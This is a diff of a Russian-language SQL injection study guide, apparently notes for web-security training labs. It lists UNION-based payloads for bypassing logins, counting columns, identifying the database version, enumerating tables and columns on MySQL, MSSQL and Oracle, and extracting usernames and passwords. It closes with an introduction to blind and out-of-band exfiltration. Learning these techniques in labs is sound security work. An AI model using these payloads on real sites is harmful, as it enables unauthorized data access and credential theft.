@@ -69,7 +69,7 @@ SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
 ```
 Этот запрос успешно регистрирует злоумышленника как пользователя administrator. 
 
-### 1.3 Извлечение данных из других таблиц баз данных
+### 1.3 Извлечение данных из других таблиц баз данных `UNION`
 Злоумышленник может использовать уязвимость инъекций SQL для извлечения данных из других таблиц в базе данных. Вы можете использовать `UNION` для выполнения дополнительного `SELECT` запроса. Например, если приложение выполняет запрос, содержащий пользовательский ввод Gifts:
 ```
 SELECT name, description FROM products WHERE category = 'Gifts'
@@ -131,6 +131,7 @@ SELECT id, username FROM users WHERE username = '' UNION SELECT NULL, NULL--';
 На Oracle, каждый `SELECT` запрос должен использовать `FROM` и указать действующую таблицу. Есть `встроенная таблица на Oracle` под названием `dual` которую можно использовать для этой цели:
 ```
 ' UNION SELECT NULL FROM DUAL--
+' UNION SELECT NULL,NULL FROM DUAL--
 ```
 Описанные полезные нагрузки используют последовательность комментариев двойного тиража `--`. На MySQL последовательность двойного тире должна сопровождаться пробелом.
 
@@ -146,11 +147,19 @@ SELECT id, username FROM users WHERE username = '' UNION SELECT NULL, NULL--';
 ```
 Если тип данных столбца не совместим со строчными данными: `Conversion failed when converting the varchar value 'a' to data type int`. Если ошибка не возникает, то соответствующая колонка подходит для извлечения строковых данных. 
 
+#### Для БД MySQL и Microsoft: 
+```
+' UNION SELECT 'a',NULL,NULL,NULL--%20
+```
 **Названия таблиц и колонок вытаскивают запросом из information_schema.**
 #### Если база `MySQL` / `PostgreSQL` / `MariaDB`
 В параметр (URL / форму) вводишь вот это:
 ```
 ' UNION SELECT table_name, NULL FROM information_schema.tables--
+```
+***Для БД MySQL и Microsoft:***
+```
+' UNION SELECT table_name, NULL FROM information_schema.tables--%20
 ```
 В ответе страницы появятся имена таблиц. Допустим таблица `users`.
 Вводишь:
@@ -161,7 +170,7 @@ SELECT id, username FROM users WHERE username = '' UNION SELECT NULL, NULL--';
 ```
 ' UNION SELECT username, password FROM users--
 ```
-#### Если база `MS SQL Server`
+***Если база MS SQL Server***
 Таблицы:
 ```
 ' UNION SELECT name, NULL FROM sys.tables--
@@ -196,8 +205,85 @@ curl "https://site/page.php?id=' UNION SELECT table_name,NULL FROM information_s
 | Тип базы данных 	| Запрос |
 |---|---|
 | Майкрософт, MySQL |	SELECT @@version |
-| Оракула |	SELECT * FROM v$version |
+| Oracle |	SELECT * FROM v$version |
 | PostgreSQL |	SELECT version() |
+
+***Для БД Oracle***
+Для 1-ой лаборатории Oracle определите количество столбцов, которые возвращаются запросом и какие столбцы содержат текстовые данные:
+```
+'+UNION+SELECT+'abc','def'+FROM+dual--
+```
+`BANNER` — это название столбца в системном представлении `v$version` в Oracle SQL, который содержит текстовую строку с описанием версии:
 ```
 ' UNION SELECT BANNER, NULL FROM v$version--
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
 ```
+***Для БД MySQL и Microsoft***: 
+```
+' UNION SELECT @@version,null --%20
+```
+#### Перечисление содержания базы данных
+Большинство типов баз данных (кроме Oracle) имеют набор представлений, называемый информационной схемой, например, `information_schema.tables` для перечисления таблиц в базе данных:
+```
+' UNION SELECT table_name,null from information_schema.tables--
+```
+`table_name` может быть и на втором месте, зависит от того в какой столбце вернутся тип строки:
+```
+' UNION SELECT NULL,'a'--
+```
+Вы можете запрашивать `information_schema.columns` для перечисления столбцов в отдельных таблицах:
+```
+' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name = 'users_aryxqb' --
+```
+`column_name` может быть и на втором месте, зависит от того в какой столбце вернутся тип строки:
+```
+' UNION SELECT NULL,'a'--
+```
+Используйте следующую полезную нагрузку для получения имен пользователей и паролей для всех пользователей:
+```
+' UNION SELECT username_oflmpq,password_vwzemw FROM users_aryxqb --
+```
+***Перечисление содержимого базы данных Oracle***:
+
+На `Oracle` вы можете перечислить таблицы, запросив `all_tables`:
+```
+' UNION SELECT null,table_name from all_tables --
+или
+' UNION SELECT table_name,null from all_tables --
+```
+Вы можете перечислить столбцы, задавая вопросы `all_tab_columns`:
+```
+' UNION SELECT column_name,null FROM all_tab_columns WHERE table_name = 'USERS_UPVLQK' --
+```
+Используйте следующую полезную нагрузку для получения имен пользователей и паролей для всех пользователей:
+```
+' UNION SELECT USERNAME_PIVCHF,PASSWORD_OVQUPI FROM USERS_UPVLQK --
+```
+
+#### Извлечение нескольких значений в одной колонке
+Вы можете получить несколько значений вместе в одной колонке, сведя значения вместе. Вы можете включить сепаратор, чтобы вы могли различать комбинированные значения. Различные базы данных используют различный синтаксис для выполнения структурной концентрации.
+
+Например, на `Oracle` вы можете отправить ввод:
+```
+' UNION SELECT username || '~' || password FROM users--
+или 
+' UNION SELECT NULL,password ||'~'|| username FROM users--
+```
+**Должна быть четкая последовательность колонок**
+
+Вводимый запрос объединяет значения username и password поля, разделенные `~`:
+```
+administrator~s3cure
+wiener~peter
+carlos~montoya
+```
+
+### 1.4 Слепые уязвимости инъекций SQL `BLIND`
+Во многих случаях SQL-инъекции являются `слепыми`: приложение не возвращает ни результаты запросов, ни сообщения об ошибках базы данных. Несмотря на это, такие уязвимости позволяют получать несанкционированные данные, хотя их эксплуатация сложнее.
+
+Для использования слепых SQL-инъекций применяются следующие подходы:
+* изменение логики запроса для выявления различий в ответе приложения в зависимости от истинности условия (булевая логика, условные ошибки);
+* использование временных задержек, позволяющих определить результат условия по времени отклика;
+* внеполосное взаимодействие (`OAST`), которое позволяет эксфильтровать данные, например через DNS-запросы к контролируемому домену. `OAST` — это когда приложение само выходит во внешний мир, и ты используешь это как сигнал. Если сайт не показывает ни ошибок, ни данных, ты заставляешь базу данных сделать сетевой запрос (например, DNS или HTTP) на сервер, который контролируешь ты.
+
+#### Эксплуатация слепой инъекции SQL путем запуска условных реакций
